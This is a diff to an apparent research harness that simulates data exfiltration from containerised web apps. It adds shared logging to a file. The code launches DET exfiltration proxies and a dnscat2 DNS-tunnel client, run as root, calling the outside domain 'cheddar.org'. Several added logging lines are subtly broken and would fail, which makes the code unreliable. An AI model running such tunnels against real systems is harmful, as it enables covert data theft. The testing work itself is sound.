@@ -27,6 +27,7 @@ import wordpress_setup.scale_wordpress
 import wordpress_setup.kubernetes_setup_functions
 import sockshop_setup.scale_sockshop
 import pickle
+import fcntl
 #from tabulate import tabulate
 
 #Locust contemporary client count.  Calculated from the function f(x) = 1/25*(-1/2*sin(pi*x/12) + 1.1), 
@@ -148,6 +149,7 @@ def main(experiment_name, config_file, prepare_app_p, spec_port, spec_ip, localh
     # step (3b) get docker configs for docker containers (assuming # is constant for the whole experiment)
     container_id_file = experiment_name + '_docker' + '_'  + '_networks.txt'
     container_config_file = experiment_name + '_docker' '_' +  '_network_configs.txt'
+    det_log_file = experiment_name + 'det_logs.log'
 
     try:
         os.remove(container_id_file)
@@ -211,6 +213,9 @@ def main(experiment_name, config_file, prepare_app_p, spec_port, spec_ip, localh
     else:
         exfil_StartEnd_times = []
 
+    with open(det_log_file, 'w') as g:
+        g.write('\n')
+
     thread.start_new_thread(cluster_creation_logger, ('./' + exp_name + '_cluster_creation_log.txt',
                                                       './' + end_sentinal_file_loc, sentinal_file_loc,
                                                       exp_name))
@@ -241,6 +246,9 @@ def main(experiment_name, config_file, prepare_app_p, spec_port, spec_ip, localh
     exfil_info_file_name = './' + experiment_name + '_det_server_local_output.txt'
 
     for exfil_counter, next_StartEnd_time in enumerate(exfil_StartEnd_times):
+        with open(det_log_file, 'a') as g:
+            g.write('\nExfil: ' + str(exfil_counter))
+
         next_exfil_start_time = next_StartEnd_time[0]
         next_exfil_end_time = next_StartEnd_time[1]
         cur_exfil_method = exfil_methods[exfil_counter]
@@ -258,7 +266,8 @@ def main(experiment_name, config_file, prepare_app_p, spec_port, spec_ip, localh
             selected_container,local_det = start_det_exfil_path(exfil_paths, exfil_counter, cur_exfil_protocol, localhostip,
                                                                 maxsleep, DET_max_exfil_bytes_in_packet, DET_min_exfil_bytes_in_packet,
                                                                 experiment_name, start_time, network_plugin, next_exfil_start_time,
-                                                                originator_class, cur_exfil_method, exfil_protocols, True)
+                                                                originator_class, cur_exfil_method, exfil_protocols, True,
+                                                                det_log_file)
 
             #time.sleep(start_time + next_exfil_end_time - time.time())
             ## monitor for one of the exfil containers being stopped and restart if possible...
@@ -287,7 +296,7 @@ def main(experiment_name, config_file, prepare_app_p, spec_port, spec_ip, localh
                                              maxsleep, DET_max_exfil_bytes_in_packet,
                                              DET_min_exfil_bytes_in_packet, experiment_name, start_time,
                                              network_plugin, next_exfil_start_time, originator_class,
-                                             cur_exfil_method, exfil_protocols, False)
+                                             cur_exfil_method, exfil_protocols, False, det_log_file)
 
             stop_det_instances(selected_container, cur_exfil_method)
 
@@ -375,7 +384,7 @@ def containers_still_alive_p(selected_containers):
 def start_det_exfil_path(exfil_paths, exfil_counter, cur_exfil_protocol, localhostip, maxsleep,
                          DET_max_exfil_bytes_in_packet, DET_min_exfil_bytes_in_packet, experiment_name,
                          start_time, network_plugin, next_exfil_start_time, originator_class,
-                         cur_exfil_method, exfil_protocols, wait_p):
+                         cur_exfil_method, exfil_protocols, wait_p, det_log_file):
     # setup config files for proxy DET instances and start them
     # note: this is only going to work for a single exp_support_scripts and a single dst, ATM
     selected_containers, class_to_networks = find_exfil_path(exfil_paths, exfil_counter)
@@ -385,14 +394,14 @@ def start_det_exfil_path(exfil_paths, exfil_counter, cur_exfil_protocol, localho
 
     start_det_proxies(exfil_paths, exfil_counter, selected_containers, proxy_instance_to_networks_to_ip,
                       cur_exfil_protocol, localhostip, class_to_networks, maxsleep,
-                      DET_max_exfil_bytes_in_packet, DET_min_exfil_bytes_in_packet)
+                      DET_max_exfil_bytes_in_packet, DET_min_exfil_bytes_in_packet, det_log_file)
 
     print "preparing to start local_det_server...."
 
     # this does NOT need to be modified (somewhat surprisingly)
     local_det = start_det_server_local(cur_exfil_protocol, ip, maxsleep[exfil_counter],
                                        DET_max_exfil_bytes_in_packet[exfil_counter],
-                                       DET_min_exfil_bytes_in_packet[exfil_counter], experiment_name)
+                                       DET_min_exfil_bytes_in_packet[exfil_counter], experiment_name, det_log_file)
 
     ######
     if wait_p:
@@ -404,7 +413,7 @@ def start_det_exfil_path(exfil_paths, exfil_counter, cur_exfil_protocol, localho
     start_det_exfil_originator(exfil_paths, exfil_counter, originator_class, selected_containers,
                                proxy_instance_to_networks_to_ip, localhostip, class_to_networks, maxsleep,
                                DET_min_exfil_bytes_in_packet, DET_max_exfil_bytes_in_packet,
-                               cur_exfil_method, exfil_protocols)
+                               cur_exfil_method, exfil_protocols, det_log_file)
 
     return selected_containers, local_det
 
@@ -419,15 +428,21 @@ def find_exfil_path(exfil_paths, exfil_counter):
     return selected_container, class_to_networks
 
 def start_det_proxies(exfil_paths, exfil_counter, selected_container,proxy_instance_to_networks_to_ip, cur_exfil_protocol,
-                      localhostip, class_to_networks, maxsleep, DET_max_exfil_bytes_in_packet, DET_min_exfil_bytes_in_packet):
+                      localhostip, class_to_networks, maxsleep, DET_max_exfil_bytes_in_packet, DET_min_exfil_bytes_in_packet,
+                      det_log_file):
     for exfil_element in exfil_paths[exfil_counter][:-1]:
         container_instance = selected_container[exfil_element]
         # going to determine srcs and dests by looking backword into the exp_support_scripts class, index into the selected proxies,
         dst, src = find_dst_and_src_ips_for_det(exfil_paths[exfil_counter], exfil_element,
                                                 selected_container, localhostip,
                                                 proxy_instance_to_networks_to_ip, class_to_networks)
-        print "cur_dst_src", dst, src, " for ", container_instance, "lzl"
-        print "config stuff", container_instance.name, src, dst, proxy_instance_to_networks_to_ip[container_instance]
+        output_lines = "cur_dst_src " + dst + '  ' + src + " for " + container_instance, " lzl \n" + " config stuff: " + \
+                        container_instance.name + ' ' + src + ' ' + dst + ' ' + proxy_instance_to_networks_to_ip[container_instance]
+        print output_lines
+        with open(det_log_file, 'a') as g:
+            fcntl.flock(g, fcntl.LOCK_EX)
+            g.write(output_lines)
+            fcntl.flock(g, fcntl.LOCK_UN)
         start_det_proxy_mode(orchestrator, container_instance, src, dst, cur_exfil_protocol,
                              maxsleep[exfil_counter], DET_max_exfil_bytes_in_packet[exfil_counter],
                              DET_min_exfil_bytes_in_packet[exfil_counter])
@@ -435,7 +450,7 @@ def start_det_proxies(exfil_paths, exfil_counter, selected_container,proxy_insta
 
 def start_det_exfil_originator(exfil_paths, exfil_counter, originator_class, selected_container, proxy_instance_to_networks_to_ip,
                                localhostip, class_to_networks, maxsleep, DET_min_exfil_bytes_in_packet, DET_max_exfil_bytes_in_packet,
-                               cur_exfil_method, exfil_protocols):
+                               cur_exfil_method, exfil_protocols, det_log_file):
     # now setup the originator (i.e. the client that originates the exfiltrated data)
     next_instance_ip, _ = find_dst_and_src_ips_for_det(exfil_paths[exfil_counter], originator_class,
                                                        selected_container, localhostip,
@@ -458,7 +473,7 @@ def start_det_exfil_originator(exfil_paths, exfil_counter, originator_class, sel
     if cur_exfil_method == 'DET':
         thread.start_new_thread(start_det_client, (file_to_exfil, exfil_protocols[exfil_counter], container))
     elif cur_exfil_method == 'dnscat':
-        thread.start_new_thread(start_dnscat_client, (container,))
+        thread.start_new_thread(start_dnscat_client, (container,det_log_file))
     else:
         print "that exfiltration method was not recognized!"
 
@@ -1205,7 +1220,7 @@ def start_det_proxy_mode(orchestrator, container, src, dst, protocol, maxsleep, 
         pass
 
 
-def start_det_server_local(protocol, src, maxsleep, maxbytesread, minbytesread, experiment_name):
+def start_det_server_local(protocol, src, maxsleep, maxbytesread, minbytesread, experiment_name, det_log_file):
     # okay, need to modify this so that it can work (can use the working version above as a template)
     #'''
     cp_command = ['sudo', 'cp', "./exp_support_scripts/det_config_local_template.json", "/DET/det_config_local_configured.json"]
@@ -1243,6 +1258,12 @@ def start_det_server_local(protocol, src, maxsleep, maxbytesread, minbytesread, 
     # note: this will remove the files existing contents (which is fine w/ me!)
     with open('./' + experiment_name + '_det_server_local_output.txt', 'w') as f:
         cmd = subprocess.Popen(cmds, cwd='/DET/', preexec_fn=os.setsid, stdout=f)
+
+    with open(det_log_file, 'a') as g:
+        fcntl.flock(g, fcntl.LOCK_EX)
+        g.write(cmd)
+        fcntl.flock(g, fcntl.LOCK_UN)
+
     return cmd
 
 def parse_local_det_output(exfil_info_file_name, protocol):
@@ -1345,11 +1366,16 @@ def setup_dnscat_server():
     # Step (3): [LATER] switch it back @ and of experiment
     pass
 
-def start_dnscat_client(container):
+def start_dnscat_client(container, det_log_file):
     cmds = ['/dnscat2/client/dnscat', 'cheddar.org']
     print "start dns exfil commands", str(cmds)
     out = container.exec_run(cmds, user="root", workdir='/dnscat2/client/', stdout=True)
     print "dnscat client output output"
+
+    with open(det_log_file, 'a') as g:
+        fcntl.flock(g, fcntl.LOCK_EX)
+        g.write(out)
+        fcntl.flock(g, fcntl.LOCK_UN)
 
 def stop_dnscat_client(container):
     cmds = ["pkill", "dnscat"]
